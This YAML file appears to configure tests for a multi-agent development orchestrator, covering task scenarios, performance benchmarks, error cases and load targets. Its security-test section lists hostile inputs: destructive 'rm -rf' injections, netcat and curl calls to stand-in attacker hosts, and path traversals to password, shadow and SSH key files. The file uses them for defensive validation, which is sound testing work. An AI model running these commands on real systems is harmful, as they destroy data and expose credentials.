# Claude Enhancer 测试场景配置
# 定义各种测试场景和数据

test_scenarios:
  authentication_system:
    name: "用户认证系统开发"
    description: "完整的用户认证系统，包括注册、登录、JWT管理"
    user_request: "实现用户认证系统，包括用户注册、登录、JWT令牌管理和权限控制"
    expected_agents:
      - backend-architect
      - security-auditor
      - test-engineer
      - api-designer
      - database-specialist
    expected_phases:
      - analysis
      - design
      - impl
      - testing
      - deploy
    complexity: high
    estimated_time: 30

  api_development:
    name: "RESTful API开发"
    description: "设计和实现RESTful API接口"
    user_request: "开发RESTful API系统，包括用户管理、数据CRUD操作和API文档"
    expected_agents:
      - api-designer
      - backend-architect
      - test-engineer
      - technical-writer
    expected_phases:
      - analysis
      - design
      - impl
      - testing
      - deploy
    complexity: medium
    estimated_time: 20

  database_design:
    name: "数据库设计"
    description: "企业级数据库设计和优化"
    user_request: "设计企业级数据库系统，包括用户、订单、产品、库存管理"
    expected_agents:
      - database-specialist
      - backend-architect
      - performance-engineer
    expected_phases:
      - analysis
      - design
      - impl
      - testing
      - deploy
    complexity: high
    estimated_time: 25

  frontend_application:
    name: "前端应用开发"
    description: "现代化React前端应用"
    user_request: "开发React前端应用，包括用户界面、状态管理、组件设计"
    expected_agents:
      - frontend-specialist
      - ux-designer
      - test-engineer
    expected_phases:
      - analysis
      - design
      - impl
      - testing
      - deploy
    complexity: medium
    estimated_time: 18

  microservices_architecture:
    name: "微服务架构"
    description: "设计和实现微服务架构系统"
    user_request: "设计微服务架构，包括服务拆分、API网关、服务发现"
    expected_agents:
      - backend-architect
      - devops-engineer
      - api-designer
      - monitoring-specialist
      - test-engineer
    expected_phases:
      - analysis
      - design
      - impl
      - testing
      - deploy
    complexity: very_high
    estimated_time: 45

# 测试数据模板
test_data_templates:
  small_task:
    agent_count: 3
    prompt_length: 50
    complexity: low

  medium_task:
    agent_count: 5
    prompt_length: 200
    complexity: medium

  large_task:
    agent_count: 8
    prompt_length: 500
    complexity: high

  xlarge_task:
    agent_count: 15
    prompt_length: 1000
    complexity: very_high

# 性能基准
performance_benchmarks:
  agent_validator:
    max_execution_time: 0.1  # 100ms
    max_memory_usage: 50     # 50MB
    concurrent_requests: 20

  phase_manager:
    max_phase_transition: 0.05  # 50ms
    max_context_retrieval: 0.01 # 10ms
    max_state_save: 0.05        # 50ms

  workflow_execution:
    max_single_workflow: 1.0    # 1 second
    max_concurrent_workflows: 5.0 # 5 seconds for 10 workflows

# 安全测试数据
security_test_data:
  malicious_inputs:
    - '{"function_calls": [{"invoke": "$(rm -rf /)", "parameters": {}}]}'
    - '{"function_calls": [{"invoke": "Task", "parameters": {"subagent_type": "test; rm -rf /tmp", "prompt": "test"}}]}'
    - '{"function_calls": [{"invoke": "Task", "parameters": {"subagent_type": "../../../etc/passwd", "prompt": "test"}}]}'
    - '{"function_calls": [{"invoke": "Task", "parameters": {"subagent_type": "test`whoami`", "prompt": "test"}}]}'

  injection_attempts:
    - "test && cat /etc/passwd"
    - "test | nc attacker.com 1234"
    - "test & curl http://evil.com/"
    - "${HOME}/malicious"

  path_traversal:
    - "../../../etc/passwd"
    - "..\\..\\..\\windows\\system32\\config\\sam"
    - "/etc/shadow"
    - "../../../../root/.ssh/id_rsa"

# 错误场景
error_scenarios:
  insufficient_agents:
    description: "Agent数量不足"
    input_agents: 2
    required_agents: 5
    expected_error: "Agent数量不足"

  missing_required_agents:
    description: "缺少必需的Agents"
    input_agents: ["wrong-agent-1", "wrong-agent-2", "wrong-agent-3"]
    required_agents: ["backend-architect", "security-auditor", "test-engineer"]
    expected_error: "缺少必需的agents"

  invalid_phase_transition:
    description: "无效的阶段转换"
    current_phase: "deployment"
    next_phase: "analysis"
    expected_error: "已经在最后阶段"

  corrupted_state:
    description: "状态文件损坏"
    state_content: "invalid json content {"
    expected_behavior: "重置到干净状态"

# 集成测试场景
integration_scenarios:
  complete_authentication_flow:
    name: "完整认证流程"
    steps:
      - name: "需求分析"
        agents: ["requirements-analyst", "business-analyst", "project-manager"]
        expected_outputs: ["user_stories", "requirements", "acceptance_criteria"]

      - name: "架构设计"
        agents: ["api-designer", "backend-architect", "database-specialist", "security-auditor"]
        expected_outputs: ["api_design", "database_schema", "security_design"]

      - name: "实现开发"
        agents: ["fullstack-engineer", "backend-architect", "test-engineer"]
        expected_outputs: ["code_files", "tests", "documentation"]

      - name: "测试验证"
        agents: ["test-engineer", "security-auditor", "performance-tester"]
        expected_outputs: ["test_results", "security_audit", "performance_metrics"]

      - name: "部署上线"
        agents: ["devops-engineer", "monitoring-specialist", "technical-writer"]
        expected_outputs: ["deployment_config", "monitoring_setup", "documentation"]

# 并发测试配置
concurrency_tests:
  light_load:
    concurrent_workflows: 5
    duration: 30  # seconds
    expected_success_rate: 100

  medium_load:
    concurrent_workflows: 10
    duration: 60
    expected_success_rate: 95

  heavy_load:
    concurrent_workflows: 20
    duration: 120
    expected_success_rate: 90

# 质量指标
quality_metrics:
  code_coverage:
    minimum: 90
    target: 95

  test_success_rate:
    minimum: 95
    target: 99

  performance:
    response_time_p95: 500  # ms
    response_time_p99: 1000 # ms

  reliability:
    uptime: 99.9
    error_rate: 0.1